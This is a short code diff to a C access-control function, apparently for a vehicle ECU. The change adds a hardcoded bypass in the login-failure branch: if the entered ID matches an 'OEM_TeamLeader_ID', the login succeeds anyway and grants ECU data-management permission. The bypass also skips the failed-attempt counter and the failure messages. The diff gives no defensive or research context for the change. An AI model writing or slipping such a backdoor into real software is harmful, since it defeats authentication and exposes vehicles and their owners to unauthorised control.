@@ -52,11 +52,19 @@ void AccessControl__access_grant(int32_t Input_String_Length, int32_t Buffer_Len
     }
     else
     {
-        AccessControl__Agent = AccessControl__Access_Fail;
-        AccessControl__Permission = AccessControl__None;
-        AccessControl__Login_Try = AccessControl__Login_Try+1;
-        BASIC_IO__printf("Login Fail!\n");
-        BASIC_IO__printf("============================\n");
+        if(AccessControl__Input_ID == AccessControl__OEM_TeamLeader_ID)
+        {
+            AccessControl__Agent = AccessControl__Access_Success;
+            AccessControl__Permission = AccessControl__ECU_Data_Manage;
+        }
+        else
+        {
+            AccessControl__Agent = AccessControl__Access_Fail;
+            AccessControl__Permission = AccessControl__None;
+            AccessControl__Login_Try = AccessControl__Login_Try+1;
+            BASIC_IO__printf("Login Fail!\n");
+            BASIC_IO__printf("============================\n");
+        }
     }
 }
 
